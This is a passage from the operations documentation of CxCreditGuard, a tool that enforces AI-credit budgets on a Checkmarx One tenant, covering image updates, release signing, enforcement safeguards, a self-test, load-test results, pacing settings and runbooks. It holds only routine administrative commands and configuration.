base tag's current digest (OS, Python, OpenSSL fixes) and makes that release a
full image replacement. Even on the same base, a new revision of an OS package
installed on it (libpq, or a fix the build's `apk upgrade` takes) changes the hash: such a release is a replacement too.
When the newest release needs a new image, auto-update installs the newest one
that does fit, if any, whether the label or the signed file list said so.

```sh
podman login ghcr.io   # a GitHub user and the read:packages token
podman pull ghcr.io/cxsmtp/vcxcreditguard:1.2.3
podman rm -f cxcreditguard
podman run -d --name cxcreditguard --restart unless-stopped \
  -p 8000:8000 -v cxcreditguard-data:/app/data ghcr.io/cxsmtp/vcxcreditguard:1.2.3
```

The data volume carries over; a replaced image runs its own version unless an
installed one is newer and built for the same dependencies.

**OS, Python and OpenSSL fixes arrive only by replacing the image.** In-app
updates replace the app's own files, never the operating system, Python or
OpenSSL beneath them. Because the base image's digest and the OS packages are in
the dependency hash, a release built on a patched base says *needs a new
image*. Independently, when the running image's OS packages are **more than 90
days old** (recorded at build time in
`/usr/local/share/cxcreditguard/image.json`), the Updates page and the top bar
say *Image is N days old* and show the command to replace it. Replace the image
at least that often, and whenever a base-image security advisory applies.

**Compose and source installations** are not updated in place: there is no
launcher and the database is PostgreSQL, which the app cannot back up itself.
The Updates page still checks (with a token) and notifies, and shows the steps:
`git fetch --tags && git checkout v<version>`, then
`podman compose up -d --build`, after a dump (see [Backup and
restore](#backup-and-restore)). Rebuilding also picks up base-image fixes. The
single container pointed at PostgreSQL with `CXCG_DATABASE_URL` installs a
release that changes the schema only after an admin confirms having a backup of
their own, and rolls such a release back only by restoring that backup.

#### One-time setup (repository owner)

1. **Signing key.** On a trusted machine:
   `python backend/scripts/release_keygen.py` writes the private key to
   `cxcg-release-signing-key.pem` and prints the public key. Paste the public key
   into `backend/app/updates/release-signing-key.pub` and commit it; images built
   from that commit on verify every release against it. Keep an offline copy of
   the private key and delete the file after step 2.
2. **The `release` environment.** On GitHub: Settings → Environments → *New
   environment* `release`. Add **required reviewers** (the release managers;
   prevent self-review), limit *Deployment branches and tags* to tags matching
   `v*.*.*`, and store the private key file's whole contents there as the
   environment secret **`CXCG_RELEASE_SIGNING_KEY`** (not as a repository
   secret): the release job runs in this environment, so the key is handed to it
   only after a reviewer approved that run.
3. **Tag ruleset.** Settings → Rules → Rulesets → *New tag ruleset*, target
   `v*`: restrict creations, updates and deletions (bypass list: the release
   managers) and block force pushes, so only they can start a release.
4. **Publishing.** Push a version tag: `git tag -a v1.2.3 -m "notes"` then
   `git push origin v1.2.3`. `.github/workflows/release.yml` (third-party
   actions pinned by commit SHA) installs its signing tools from hash-pinned
   wheels (`.github/release-requirements.txt`) before the key is in any step's
   environment, **fails** if the public key is still the placeholder or the
   secret is missing, stamps the version into `backend/app/__init__.py` (the one
   place it lives), chooses the base image's digest, builds the release
   manifest from `deploy/podman/Dockerfile`, signs it and verifies the signature
   against the committed public key, builds the image, checks that the image's
   `/app/release-manifest.json` and `.sig` are byte for byte the signed ones,
   that `/app` is not writable by the app's user and that the image comes up as
   that version, and pushes `:1.2.3` and `:latest` with the job's `GITHUB_TOKEN`
   (`packages: write`). The base image is the latest release's, unless the tag's
   message has a line `base: refresh` (then the base tag's current digest; see
   *When the image itself must be replaced*): refresh it at least every 90 days
   and whenever a base-image advisory applies. The release notes shown in the
   app are the `## 1.2.3`
   section of a `CHANGELOG.md`, if there is one, else the tag's message. New
   packages are private by default; check the package's visibility after the
   first release, and keep it private.
5. **A read-only token per installation.** On GitHub: Settings → Developer
   settings → Personal access tokens → Tokens (classic) → *Generate new token*,
   scope **`read:packages` only**, from an account that can see the package (give
   it access under the package's settings, *Manage Actions access* / *Manage
   access*). Enter it on Settings → Updates → *Registry token*. It is encrypted
   with the master key like the Checkmarx API key, never shown again, never logged,
   and is tried at once. Until one is entered, auto-update stays on and the page
   and the top bar say *needs a registry token*; nothing fails in a loop.

**Network.** Outbound HTTPS (443) to `ghcr.io` (token exchange, tags, manifests)
and `pkg-containers.githubusercontent.com` (where GHCR serves the layer). Both are
fixed in code: no address an admin types or a registry answers is ever called,
and the registry token is only ever sent to `ghcr.io`.

### Enforcement safety

Settings has an **Enforcement safety** card. These exist because the dangerous
failure of this tool is restricting many people at once for a wrong reason.

- **Pause.** Stops every new restriction immediately, mid-cycle included.
  Usage is still read, warnings are still sent, and access is still **given
  back** when someone drops under budget or a limit is raised. Use it whenever
  the numbers look wrong.
- **Ceilings.** If one cycle is about to start restricting more than 25 limits
  or 100 users and projects that are not restricted now, it restricts nobody,
  pauses itself, and alerts the admins with the counts. Both numbers are
  configurable; the defaults suit a tenant of a few hundred engineers. Resuming
  after such a pause lets the next cycle through once without the ceiling, on
  the understanding that an admin has looked. A first enforcement too large
  for one cycle's write budget (see [Sizing and scale](#sizing-and-scale)) is
  judged once, when it starts: its continuation on the next cycles is not
  counted as new, but users or projects added to the limit since are.
- **Protected roles.** None by default: everyone over budget is restricted,
  and a restriction a composite role or a group keeps from biting is reported
  as such (audit log, one warning per user per period, and "cannot fully bite"
  in the Simulation). A user holding one of the Checkmarx roles listed here is
  never restricted, and is released if the role is granted later; they still
  get the warning. An install that stored the old default (`ast-admin`,
  `iam-admin`) is switched to none by migration `a4d8e2c6f1b9`; any other
  list is kept. **Check listed names against your tenant**: a name that
  matches nothing protects nobody.
- **The API key's own account** is never restricted, whatever the setting:
  restricting it could remove rights CreditGuard needs to restore others. The
  Simulation and the warning say exactly that, and it is audited each period it
  would have been restricted.
- **Held readings.** If the tenant suddenly reports less than half the usage it
  did a moment ago for a dimension, the reading is held rather than believed,
  until at least three readings in a row over at least two hours tell the same
  story. Limits keep being judged on the last believed reading meanwhile, and
  each cycle that holds one reports it as a warning in its result.
- **Roles a user restriction removes.** The client roles a user restriction
  takes (API field `ai_roles`; default `create-fusion-scan`, `manage-fusion`,
  `update-llm-scan-mode`, `manage-llm-configuration`), picked from the
  tenant's own roles; `ai-triage-assist` is refused. Applies to restrictions made from then on. See
  [Restricting a user, in detail](#what-the-enforcement-actions-actually-are).
- **Fusion lock.** *Lock Fusion against per-scan override* (on by default, API
  field `fusion_lock_override`): when a limit turns Fusion off, also set
  `allowOverride: false` on the project's setting. Not verified to stop a scan
  started with its own settings; refused by the tenant, it falls back to the
  value alone. Optional: policy violations record any scan that ran Fusion anyway.
- **Unknown outcomes.** If a restriction or restore fails in a way that leaves
  it unclear whether the tenant changed (a timeout, a dropped connection), the
  record says so and the next cycle checks the tenant rather than assuming.

### Readiness checklist

Settings → Enforcement and Diagnose show a **Readiness** card, each item green,
amber (pending) or red, with a one-line fix and a link to where to fix it
(`app/services/readiness.py`, `GET /api/readiness`). Every item is computed
from data the app already has:

1. **Connected to Checkmarx One**: the connection check passes.
2. **Activity log readable**: the activity log is the usage source and its
   last read succeeded.
3. **Counts match Checkmarx**: the latest daily reconciliation of the log's sum
   with the summary's total is within 0.5% (pending until the first one).
4. **Self-test passed**: a passed self-test on a user and one on a project in
   the last 30 days (kinds that were not applicable do not count against it;
   demo runs do not count).
5. **Dry run reviewed**: an admin clicked **Reviewed** on the Simulation page
   after the last budget change.

A **new install** starts watch-only: the data migration `b3e7f1a9c2d5` finds
an empty database (no account, budget or connection) and leaves enforcement
paused with the readiness gate set. Turning enforcement on (the Readiness
card's *Turn enforcement on*, or the pause switch) then needs every item
green, or an admin's explicit override: typing `ENFORCE`, audited as
`readiness.override` with the items that were not green. Once enforcement is
on the gate is gone; the checklist never turns enforcement off again, and an
item that turns from green to red raises a WARNING and shows on Diagnose.
**Existing installs** are unchanged: enforcement stays as it was and the
checklist is information only. Viewers see the checklist; only admins mark the
dry run reviewed or turn enforcement on.

### Enforcement self-test

Settings → Enforcement → **Enforcement self-test** (admins only; viewers get a
403) proves on the live tenant that enforcement really works there. Pick a
user, a project, or both (and, for a project, which of Auto Triage, PR triage
and remediation and Fusion to test), press *Check what it would change*, read
exactly what will be changed and for how long, type each target's name, and
run it. For each target it:

1. reads the current state: the user's direct client roles and effective roles
   (with where each AI role comes from), or the project's settings;
2. applies the restriction **through the same code a budget breach uses**
   (`enforcement.apply_enforcement`, with a stand-in budget that exists for
   that run only);
3. reads it back and checks the roles are gone or the settings are off, and
   for a user reports any AI role still held through a group or a composite
   role: a restriction that cannot bite;
4. restores it from the undo snapshot **through the Restore path**;
5. reads it back again and compares with step 1, setting by setting. Lists are
   compared regardless of order (Checkmarx may list roles in another order),
   but exactly otherwise: a role someone granted meanwhile is a difference,
   and so is a setting that changed where it is set (the level a Fusion value
   comes from, the AI configuration's `scope` and `allowAiUsage`).

**Fusion inherited from the tenant is not tested.** Restore can only write a
Fusion value back at the project level, which would pin an inherited value
there for good (see [Remaining unknowns](#remaining-unknowns) #6). So when the
read in step 1 shows the project inherits Fusion, the self-test leaves Fusion
(and the repository's Fusion setting, which goes with it) alone, marks it *not
applicable* and says so on the check and in the result; the other settings are
tested as usual. The same goes for Auto Triage when the project's AI agent
configuration is read with a scope other than `project` (it is inherited):
writing it back would pin the configuration on the project, so nothing is
written for it.

The result has a before / restricted / restored diff per setting, pass or fail
per step and the time each took. The last 20 results are kept, and Diagnose
shows the last one (passed or failed, and when).

Safety:

- **Refusals.** A target that is restricted now (or may be, after an
  unconfirmed write), covered by an active budget that has reached its warning
  threshold (or is warned, breached or restricted this period), exempt, holding
  a protected role, or the account the API key belongs to is refused, and so
  is a project with a scan running or queued (if the scan list cannot be read,
  that is a warning). The reasons are shown; nothing is changed, and the
  refusal is audited.
- **The restore always runs**, in a `finally`, whatever a check found or
  raised. The restriction is an ordinary enforcement record (no budget, period
  `selftest-<run>`). If its restore fails, or answers OK but does not read back,
  it is marked as in doubt (`outcome_unknown`) and stays a tracked
  restriction: a critical notification with *Restore* on it and the exact
  snapshot is raised, the result shows the snapshot, and the next cycle's
  sweep lifts it (reason `selftest_cleanup`). It is counted with the
  restrictions in force meanwhile. A target is never left restricted silently.
- **A self-test never releases a real budget's restriction.** Lifting one of
  its restrictions (the sweep, or *Restore* on its alert) uses the
  `selftest_cleanup` reason, never the admin's: if a real budget restricts the
  same target by then, what the self-test recorded is handed over to that
  restriction, which stays in force, and *Restore* says so instead of
  "Access restored".
- **No database transaction is held across a Checkmarx call**: what is about to
  be done is committed first, as for every restriction.
- **One at a time.** A second self-test is refused while one runs: in the
  process, and in the database by a partial unique index on the result
  table's `running` status (so a second process cannot start one either). A
  run left "running" by a process that stopped is recorded as interrupted
  after 15 minutes. The self-test holds the target's own lock (the one the
  cycle takes for each target) from its checks to its last read, so a cycle
  working on the same target waits for it (and it waits up to 30 seconds for
  the cycle); the refusal checks and the running-scan check are repeated under
  that lock.
- **Audited**: start, every step, the restore and the outcome, in the
  hash-chained audit log, next to the restriction's own entries. The
  "restricted" and "restored" notifications the restriction code would raise
  are not sent; the result says it instead.
- With enforcement paused, or no budget set to enforce, the self-test still
  runs (you asked for it) and says that budgets will not restrict anyone until
  enforcement is on. In demo mode it runs against a small built-in demo tenant
  (made-up data, nothing leaves the process), only on the demo users and
  projects, and says so; one demo user keeps a Fusion role through a group, to
  show a restriction that cannot bite. A demo restriction whose restore
  failed is retried against the demo tenant by every cycle (demo mode or
  not), and its Restore button uses the demo tenant too: it is never sent to
  Checkmarx One.

### Accounts

Each person's own page (their name, top right) changes their password and sets
up two factor authentication. Turning two factor on shows ten recovery codes,
once; each signs in one time if the device is lost. An admin can reset another
person's password or two factor from Settings, never their own, so keep at least
two admin accounts.

A sign-in lockout clears by itself (an hour at most). If the only administrator
has lost their password, or their authenticator and their recovery codes, there
is nobody to reset them, and the way back is from a shell in the container:

```sh
podman compose exec app python -m scripts.recover_admin <username>
```

It prints a temporary password that must be changed at the next sign-in,
switches two factor off for that account, and records the reset in the audit
log. The bootstrap variables do not help here: they only create an account when
there are none.

## Sizing and scale

CxCreditGuard has been load tested against a synthetic tenant of **2,000
projects** (60% with a repository, half with Auto Triage on), **1,000 users**,
**100 groups** (nested, one holding 1,000 projects), **30 applications**,
consumption for every dimension and scans on 400 projects, with **50 ms per
Checkmarx call** and a **429 every 500 calls** (`Retry-After: 1`). Seeded
limits: 200 user, 50 project, 10 group (one covering 1,000 projects with all
three project actions, about 3,500 restrictions) and 5 application limits, all
enforcing. The cycle interval is the default 15 minutes.

Measured (`scripts/loadtest.py`; before = the version without pacing, 6
cycles; after on PostgreSQL = this version, 7 cycles, re-measured after the
review fixes below; after on SQLite = the first pacing version, 10 cycles):

| | Before, PostgreSQL | After, PostgreSQL | Before, SQLite | After, SQLite |
| --- | --- | --- | --- | --- |
| First enforcement of 3,545 restrictions | 1 cycle of 874 s | 5 cycles of 180–196 s | 1 cycle of 744 s | 5 cycles of 69–183 s |
| Steady-state cycle | 313 s | **68–72 s** | 281 s | 65 s |
| Checkmarx calls per steady cycle | 3,796 | 1,642–1,720 | 3,796 | 1,658 |
| Database statements per steady cycle | 43,230 | 12,416–13,004 | 49,469 | 19,364 |
| Restrictions in force read back | all, every cycle | each every 60 min (806 a cycle) | all, every cycle | each every 60 min |
| Restricted projects checked for policy violations | the same 50 of 1,070, never the rest | 150 a cycle: each every 8 cycles (2 h) | the same 50 | each every 8 cycles |
| Consumption readings on disk after a month (15 min) | 5.5 GB | **≈ 1.0 GB** | 9 GB | (not measured) |
| Peak memory (RSS) | 226 MB | 240 MB | 216 MB | 258 MB |
| Slowest GUI endpoint | dry run 1,967 ms | dashboard 670 ms, dry run 643 ms | dry run 1,049 ms | dry run 686 ms |

Every endpoint the GUI uses answers in under a second at this size (the
Simulation dry run 0.65 s, the Budgets list 0.5 s, the report 0.25 s, the blast
radius of the 1,000-project group 0.1 s and 22 KB instead of 0.9 s and 344 KB,
a page of restrictions in force 26 ms).
Auto-triage attribution, with 1,000 projects showing new Auto Triage every
cycle, works through 150 a cycle: each is traced within 7 cycles (the oldest
waited 2.5 hours; until then its credits count on the project).

**What a cycle costs.** In steady state about 820 Checkmarx calls per
1,000 projects per cycle (verification read-backs spread over the hour, scan
listings for policy violations and auto-triage attribution, consumption pages,
and the organisation sync every 30 minutes; about 575 of them read repository
settings back: PR triage and remediation, repository Fusion), about 70 s on
PostgreSQL and 65 s on SQLite with 50 ms calls: well inside a 15 minute
interval. The first enforcement of the 1,000-project group (3,545
restrictions) is spread over 5 cycles of about 3 minutes each, with
the progress on the Budgets page.

**Database growth.** Each cycle stores one consumption reading per dimension:
3,033 `usage_record` rows for this tenant. Measured on PostgreSQL:

| | Before | Now |
| --- | --- | --- |
| A reading, as stored | ≈ 1.9 MB (rows with their raw copy, plus every response page again on `usage_snapshot.raw`) | ≈ 1.7 MB (rows with their raw copy; no response pages) |
| A reading older than a week | the same | ≈ 0.7 MB (raw copy cleared: 64% of the rows' bytes) |
| Readings kept, per dimension, 30 days at 15 minutes | 2,880 | 936 (all of 3 days, then one an hour) |
| Readings kept, per dimension, 365 days | 35,040 | 1,501 (… then one a day after 40 days) |
| On disk after a month | ≈ 5.5 GB | **≈ 1.0 GB** |
| On disk after a year (`retention.days` 365) | ≈ 66 GB | **≈ 1.4 GB** |
| Growth after the first 40 days | ≈ 5.5 GB a month | ≈ 21 MB a month (one reading a day) |

The simulation in the load test (`--simulate-thinning-days 45`: 45 days of
readings at 15 minutes, 25 rows each, with auto-triage attribution on and so a
charge on every project reading, 4,470 in all, then one retention run) kept
1,184 readings per dimension of 4,322 (the project dimension too: charges pin
nothing, and all 4,470 were kept), and the two tables went from 169 MB to
35 MB after `VACUUM FULL` (the run took 3 s); the figures above scale its
per-row sizes to the real 3,033 rows. With thinning switched off, readings are kept
whole for the whole window (raw copies are still cleared after a week:
≈ 2.7 GB a month, ≈ 25 GB a year). Restrictions, notifications and
audit entries add a few MB per thousand restrictions, once. At this size use
PostgreSQL. PostgreSQL reuses the space freed by thinning for new rows; it does
not give it back to the file system without a `VACUUM FULL`.

**Recommendations.**

* **PostgreSQL above about 500 projects** (or 300 users). SQLite has a single
  writer: a cycle's writes and the GUI's sign-ins and edits queue behind each
  other. It works at 2,000 projects (measured above) but PostgreSQL is
  faster and does not stall the GUI.
* **A 15 minute interval** up to about 3,000 projects with the default budgets;
  30 minutes above that, or raise the budgets below only as far as the cycle
  record shows time to spare (`http.time_budget_left_seconds`).
* Do not lower the interval to 2 or 5 minutes at this size: the time budget
  keeps a cycle from overrunning, but each cycle then does less of the rotating
  work, so coverage (below) takes more cycles.

**Pacing settings** (Settings → Enforcement, *Pacing for large tenants*; API
fields in brackets). Each is a per-cycle budget; **0 means no budget**:
everything, every cycle. For the verification interval and cap, the
restriction changes and the time budget that is the behaviour before pacing
existed. It is not for the two rotations: before pacing the policy violation
check had a fixed cap of 50 restricted projects a cycle (always the same 50)
and auto-triage attribution one of 50 projects and 300 scan listings; set to 0
they now have **no cap at all**, every restricted project and every waiting
project each cycle.

| Setting | Default | What it means |
| ------- | ------- | ------------- |
| Verify each restriction every (`verify_interval_minutes`) | 60 | Each restriction in force is read back at most this often, spread evenly over the cycles, the oldest-verified first. That is every restriction the cycle keeps in force, including those no limit's current plan still includes (a project that left the group or application, which stays restricted until its period ends; a hold-until-released limit's earlier periods), but not those being lifted. A new restriction is read back as it is applied; a limit whose enforcement, active state or project actions change has its restrictions read back first on the next cycle. One that cannot be read back (an error, or no readable answer) moves behind the others and is not due again for an interval; one with no readable answer is written again then, to keep it in force. A notification (once a day, decided after the cycle's read-backs) says when any restriction in force has gone unread for more than twice the interval, also naming attempts whose outcome has stayed unknown that long and restrictions whose lifting keeps failing. A restriction on a user or project deleted in Checkmarx One is not read back (counted as `target_deleted`). 0: every restriction, every cycle. |
| Read-backs per cycle (`max_verifications_per_cycle`) | 2000 | At most this many read-backs in one cycle. With more in force than this covers within the interval, each is verified less often; the cycle record says how often (`each_verified_within_minutes`). At the defaults and a 15 minute interval every restriction is read back within the hour up to 8,000 in force, if the cycle has the time. |
| Restriction changes per cycle (`max_writes_per_cycle`) | 1000 | Every change a cycle makes to the tenant, spent in this order: **lifts** first (a limit switched off or within budget again, an exemption, the period rollover), then **drift re-asserted** by the verification, then **new restrictions**, small limits first, and last **restrictions that could not be read back, written again** to keep them in force (each at most once per verification interval). Giving access back therefore never waits behind a rollout, and a re-assert the budget does not reach is done first on the next cycle (the restriction stays due); at worst a drift found waits as many cycles as lifts and re-asserts fill. A larger group or application is restricted over several cycles, resuming where it stopped ("Restricting 1,240 of 2,000 projects" on the Budgets page, one notification when it starts); a large lift likewise ("Lifting: 760 still in force"; the period shows *restored* only once the last is lifted). A limit needing more than 50 changes waits until every other limit has had its turn in the cycle. A limit switched off in the GUI lifts at most 200 at once (whatever the cycle is doing meanwhile), the rest by the cycles. The safety ceilings judge each user or project of a rollout once: the ones it has still to restrict are remembered by id, and anything else (a project added to the group since, a new breach after the period was lifted) is judged again. |
| Projects checked for violations per cycle (`violation_projects_per_cycle`) | 150 | Restricted projects whose scans are listed, least recently checked first: each at least every ceil(restricted / 150) cycles. |
| Auto-triage projects per cycle (`attribution_projects_per_cycle`) | 150 | Projects whose new Auto Triage is traced to scans, longest waiting first. |
| Auto-triage scan requests per cycle (`attribution_requests_per_cycle`) | 600 | Scan listings attribution may make in one cycle. |
| Parallel reads (`read_concurrency`) | 4 | Independent read-only calls (read-backs, scan listings) made at the same time; writes are always one at a time. 1: one call after another. 429 and `Retry-After` are honoured per call as before. |
| Cycle time budget (`cycle_time_budget_pct`) | 80 | Once a cycle has run this share of its interval (at least a minute), it stops starting new per-target work and leaves the rest to the next cycle instead of overrunning. The hung-cycle watchdog (2 hours) is unchanged. |

**Coverage is on every cycle's record** (`scheduler_run.stats`, also
returned by `POST /api/ops/run-cycle`): `evaluate.pacing.verification` (restrictions in
force (applied, plus `outcome_unknown`), `rotation` = `in_a_plan` +
`outside_a_plan`, `being_lifted` (of which `lift_failing`), `target_deleted`,
due, `verified` (read back: `held` + `reasserted`), `unverified` (no readable
answer, written again), `reapplies_deferred`, `reasserts_deferred`, `failed`,
`each_verified_within_minutes`, `oldest_verified_minutes_ago`,
`unverified_beyond_twice_the_interval`,
`outcome_unknown_beyond_twice_the_interval`, `lift_failing_still_in_force`),
`evaluate.pacing.writes` (budget, used, deferred, `lifts`, `reasserts`,
`reapplies_unreadable`, `stopped_for_time`), `evaluate.rollouts` (limit, done, total),
`violations` (`watched`, `per_cycle`, `each_checked_every_cycles`,
`oldest_check_minutes`), `auto_triage_attribution` (`backlog`,
`oldest_waiting_minutes`, `each_within_cycles`) and `http` (requests, 429s,
retries, seconds waited, per step, and the time budget left). The API client
keeps its connections open between calls and cycles.

**Large lists in the GUI.** Budgets, Simulation, Reports and Policy violations
show 100 rows a page (sorting and the column filters still apply to every row);
the Notification Center's active restrictions are searched and paged on the
server (`GET /api/notifications/enforcements/page?q=&offset=&limit=`); the
entity pickers search the server. A blast radius lists its first 200 targets
(20 per Simulation row) with the complete counts (`targets_total`).

**Running the load test.** Not part of `pytest`:

```sh
cd backend
# SQLite (a file in a temporary directory)
python -m scripts.loadtest --database sqlite --cycles 10 --out /tmp/lt-sqlite.md
# PostgreSQL: a fresh database is created on this server and dropped afterwards
python -m scripts.loadtest \
  --database "postgresql+psycopg://postgres@/postgres?host=/tmp&port=5433" \
  --cycles 10 --latency-ms 50 --rate-limit-every 500 --out /tmp/lt-pg.md
```

Options set the tenant size (`--projects`, `--users`, `--groups`,
`--applications`), latency and rate limiting, and `--profile-cycle N` profiles
one cycle (functions and the most frequent SQL). Each cycle's record has the
size of the consumption readings (`usage`); on PostgreSQL
`--simulate-thinning-days N` (with `--simulate-rows R`) then writes N days of
readings at the interval and runs the retention job once, reporting the
readings kept per dimension and the size before and after. The simulated clock moves on
by the interval before every cycle, so time-based work behaves as on a real
schedule. The synthetic tenant is `backend/tests/scale_tenant.py`; small
regression tests of the pacing are in `backend/tests/test_scale_pacing.py`.

## Runbook: the utility restricted someone it should not have

1. **Restore first, investigate second.** Open the Notification Center, find the
   entry for that user or project, and use "Restore access". It re-applies the
   exact role mappings or project setting captured in the enforcement record
   before the change. Do not hand edit roles in Checkmarx One, because the
   utility would then hold a stale undo snapshot.
2. **Stop it happening again in the next cycle.** On the Limits page, either
   switch that limit to monitor only or add the entity to the exemption list.
   Restoring access without doing this means the next cycle re-enforces.
3. **Work out which limit fired.** The notification names the entity and the
   limit. Remember that the most restrictive limit wins: a user can be restricted
   by a group, project or application limit they had no idea applied to them.
4. **Check the attribution.** The Audit Log holds the before and after state of
   every action. If usage was attributed to the wrong user, the raw consumption
   row is stored on each reading of the last week (and on the latest reading,
   whatever its age) for exactly this comparison.
5. **If the GUI is unavailable**, restoring access in Checkmarx One directly is
   always safe: re-add the role, or re-enable the project setting. Then mark the
   enforcement record as reversed in the utility, or clear the limit, before the
   next cycle runs.
6. **Blast radius check.** An application limit disables AI features on every
   project in that application, and a group limit on every project in that group.
   The notification lists each target it touched, and each has its own restore.
7. **If someone's usage looks wrong**, check Settings for unmatched credit usage.
   Consumption reported against a name or address that does not match a synced IAM
   user is not counted towards any user limit, and the fix is to map it there.

## Runbook: a figure on screen does not match Checkmarx

Run the diagnostic. It answers the question directly and touches nothing:

```sh
cd backend
python -m scripts.diagnose_usage --project "carolorg/CxHybrid"
python -m scripts.diagnose_usage --user "someone@example.com"
```

It walks the whole chain and names the cause: whether the entity is synced, whether
the tenant reports that dimension, exactly which row the snapshot contained, and how
that row became the number on screen. The two causes it separates are the ones that
look identical from the outside:

- **Attribution failure.** Checkmarx reported credits under a name or id that did
  not match the synced entity, so they count towards nothing. It prints the reported
  identifier next to the synced one.
- **Baseline effect.** The credits matched, but they were spent before the budget
  period opened, so they do not count against it. It prints the reported total, the
  baseline and the difference, and says which period type rule applied.

## Runbook: turning enforcement on for the first time

A new install starts watch-only and shows the
[readiness checklist](#readiness-checklist) on Settings → Enforcement: the
steps below turn it green. Recommended order, because the failure mode of this
tool is restricting the wrong person:

1. Connect with a **read only** API key and leave every limit on its monitor only
   default. Nothing can be restricted, and the write permissions are not needed.
2. Let it run for at least one full budget period. Watch the Limits page: are the
   figures what you expect, and is anyone showing as unmatched on Settings?
3. Fix attribution first. An unmatched user is a budget that silently undercounts.
4. Add exemptions for break glass accounts and any project that must never lose AI
   features.
5. Run the **enforcement self-test** (Settings → Enforcement) on a user and a
   project you control: it restricts them, reads it back, restores them and
   checks they read exactly as before. Then switch **one** limit to enforce, on
   an entity you control, and verify the restriction and the restore both work
   end to end.
6. Only then widen. Bulk edit can switch many limits at once, and switching them
   back to monitor only lifts every restriction they caused.

## Remaining unknowns

None of these block the utility, and each one degrades safely rather than guessing.
They are listed because each has a cost worth knowing about.

1. **How to discover a project's `repo_id`.** Read opportunistically from the
   project payload (`repoId`, `repositoryId`, `repo_id`), accepting both the
   integer `repoId` the API normally reports (e.g. `"repoId": 228481`) and the
   string form older payloads carry. Where it is still absent, the PR
   triage and remediation half of project enforcement is skipped and the record says
   so; Auto Triage is still disabled. A list-repositories endpoint would close this,
   and this is the most valuable of the remaining gaps. *Seen on a live tenant
   (2026-11, about 2,000 projects):* `repoId` is an integer on every project
   imported through an SCM integration (760 of 1,968: GitHub, GitHub App, Azure,
   Bitbucket, GitLab), next to a string `scmRepoId` that is a different value;
   projects created otherwise (CLI, MCP, upload) carry `repoUrl` but no `repoId`.
   The repos-manager read returns `remediationSeverities` wrapped as
   `{"value": [...], "isEditable": true}`. Both that and a bare list are read,
   and every write sends back the shape that was read; a shape that is neither
   is never written (the restriction is left unchanged and reported). That the
   tenant accepts the wrapped form on a write is not yet verified.
2. **Pagination parameters for `/users/v2`.** Settled on a live tenant: without
   parameters it returns the first 100 users and `filteredCount`; `first` (a row
   offset) and `max` page correctly (`max` up to at least 1,000), and `page` and
   `size` are ignored (the first 100 come back again). The sync asks once without
   parameters and then pages with `first` and `max`; if that makes no progress it
   warns with the exact shortfall rather than treating a partial list as
   complete.
3. **The `group` dimension's row shape.** `viewBy=group` is a real dimension but
   has only ever been observed empty (also on a live tenant of about 2,000
   projects: `totalItems` 0 for `last_month`, `last_90_days` and `last_year`), so
   the row shape is unverified. Group rows are
   matched by id then name like projects, and a group that does not match falls back
   to the local rollup of its projects, which is the behaviour that was there before.
   No guess about an unseen payload can cause a wrong figure.
4. **Fusion's lock and repository setting.** Whether `allowOverride: false` on a
   project's `scan.config.ai.fusionEnabled` stops a scan started with its own
   settings from turning Fusion on, and whether the repos-manager read and
   `PATCH` carry `fusionScanConfig`, are not verified. Both degrade safely: a
   refused lock falls back to the value alone, an absent repository setting is
   skipped, and any scan that ran Fusion during a restriction is recorded as a
   policy violation. Whether the AI engine without Fusion (LLM-based scanning)
   costs credits is not known either. A lock or a repository setting that a
   tenant answers 2xx to and does not keep is detected by reading it back, on
   two consecutive checks (one read straight after a write may be behind it).
5. **`scan.config.ai.allowAiUsage`.** The project configuration API exposes an
   `ai` category entry named "Allow AI Usage", overridable per project. It is not
   used: the mechanisms implemented are Auto Triage, PR triage and remediation and
   Fusion. If that flag
   is the authoritative master switch, adding it is one function in
   `app/checkmarx/platform.py`. Seen on a live tenant: it is set at the tenant
   level (`originLevel` `Tenant`, `value` `"true"`, `isPersisted` true,
   `allowOverride` true), and the project's AI agent configuration carries the
   same flag at its top level (`"allowAiUsage": true`).
6. **Removing a project's own Fusion value.** Turning Fusion off writes the
   setting at the project level, also when it was inherited (`originLevel`
   `Tenant` or `Environment`), and Restore can only write the previous value back
   at the project level, which pins it there. Whether Checkmarx One has a
   per-key delete for a project's configuration entry (so that Restore could make
   it inherit again) is not known. It is deliberately not guessed: a wrong
   `DELETE` on `/api/configuration/project` could remove the project's other
   overrides. To verify on a tenant: take a project with an inherited
   `scan.config.ai.fusionEnabled`, set it on the project in the UI, and look for
   the request the UI sends when the project value is reset to the inherited
   one; if it is a per-key call, Restore can use it for an entry recorded as
   inherited. Seen on a live tenant: an entry the project has no value for
   still reports `originLevel` `Project`, with an empty value and `isPersisted`
   false, and after a write it reads `isPersisted` true; an inherited one reports
   the level it comes from (`Tenant`) with that level's `isPersisted`. So
   whether the project had its own value is recorded from both
   (`inherited_before`, `is_persisted_before`) and said in the restriction and
   restore messages; Restore still writes the previous value back on the
   project.

   **The effect, plainly:** after a real budget has turned Fusion off on a
   project that inherited it (with the Fusion lock on, the default, this
   includes a project that inherited Fusion *off*: the lock alone is written),
   Restore leaves the project with its own Fusion value. The value is the
   same, but the project no longer follows the tenant: a later change to
   Fusion at the tenant level does not reach it until someone resets it to
   inherited in Checkmarx One. The enforcement self-test does not touch an
   inherited Fusion value for this reason. Fixing Restore waits for the
   tenant's "reset to inherited" request to be captured (see above); no
   guessed `DELETE` is sent.

7. **Where a user's roles come from.** The effective-roles, user-groups,
   group-role-mapping and composite-role reads follow Keycloak's admin REST API
   and are not verified against a real Checkmarx One tenant. Each failure is
   *source unknown*, never a reason not to restrict; a removed role then still
   read as held is decided on the next attempt (in doubt once, concluded the
   second time). A realm-level composite role containing an AI role is seen
   only as *source unknown*.
8. **Auto Triage's `allowOverride`.** The project-scope Auto Triage
   configuration carries `allowOverride` (`{"projects": false, "branches":
   true, ...}` in a captured HAR; `{"projects": true, "branches": true,
   "scannerTypes": true, "riskStatuses": true, "severityLevels": true}` on a
   live tenant, where the same read also lists an `auto_remediation` feature
   with its own `allowOverride`, and `allowAiUsage` at the top level). The
   `PUT` sends only `configurations`, every entry as read with only the
   `auto_triage` entry's `enabled` and `config` changed, so the other feature
   and every `allowOverride` are kept; `scope` and `projectId` are named by the
   path, and `allowAiUsage` (the tenant's inherited AI switch) is never echoed,
   so it cannot be pinned on the project. Restore reads the configuration again
   first. After the write the configuration is read back: if `auto_remediation`
   or `allowAiUsage` changed, the outcome is kept in doubt and an alert says so.
   **Not yet verified:** that this is the body the Checkmarx One UI sends.
   Capture one HAR of toggling Auto Triage on a project in the UI and compare
   it before enabling project enforcement on a real tenant. What each
   `allowOverride` key means is not documented: it is
